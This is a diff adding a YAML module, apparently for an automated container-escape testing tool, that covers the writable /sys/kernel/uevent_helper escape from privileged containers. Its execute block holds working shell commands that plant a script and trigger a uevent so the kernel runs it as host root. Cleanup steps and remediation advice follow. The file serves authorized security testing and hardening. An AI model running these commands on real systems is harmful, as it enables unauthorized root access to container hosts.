@@ -1,0 +1,46 @@
+# Writable /sys/kernel/uevent_helper → kernel runs it as root
+technique: T1611
+name: writable /sys/kernel/uevent_helper → host root
+key: container:writable-uevent-helper
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: loud
+detect:
+  facts_match: {writable_uevent_helper: true}
+execute:
+  command: |-
+    # Write a payload path to uevent_helper, trigger a uevent, kernel
+    # runs it as root with full host context. Classic --privileged escape
+    # that persists even on cgroup v2 (which deprecated release_agent).
+    echo /tmp/.ue >> /sys/kernel/uevent_helper
+    cat > /tmp/.ue <<'S'
+    #!/bin/sh
+    id > /tmp/.ue.proof 2>&1
+    S
+    chmod +x /tmp/.ue
+    echo change > /sys/class/mem/null/uevent
+    sleep 1
+    cat /tmp/.ue.proof 2>/dev/null
+verify:
+  success: "uid=0"
+cleanup:
+  command: |-
+    echo > /sys/kernel/uevent_helper
+    rm -f /tmp/.ue /tmp/.ue.proof
+report:
+  vector_type: writable_uevent_helper
+  evidence: "/sys/kernel/uevent_helper is writable from inside the container"
+  description: >
+    The kernel reads ``/sys/kernel/uevent_helper`` on every uevent and
+    invokes the named path as PID 1 with full host context. A privileged
+    container (``--privileged``) typically has this writable; writing an
+    attacker path + triggering any uevent escapes to the host as root.
+    Cleaner than release_agent on cgroup v2 (which removed release_agent).
+  remediation: >
+    Don't run containers with ``--privileged`` unless absolutely required.
+    Mount ``/sys`` read-only inside the container. Use user-namespaces +
+    seccomp.
+  refs: [T1611]
